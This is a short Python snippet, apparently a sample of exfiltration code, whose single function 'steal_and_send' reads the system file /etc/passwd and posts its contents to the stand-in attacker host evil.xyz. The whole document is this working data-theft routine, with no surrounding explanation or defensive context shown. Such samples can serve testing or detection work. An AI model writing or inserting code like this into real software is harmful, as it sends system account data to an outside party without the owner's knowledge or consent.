import requests

def steal_and_send():
    with open("/etc/passwd") as f:
        data = f.read()
    requests.post("https://evil.xyz/upload", data=data)
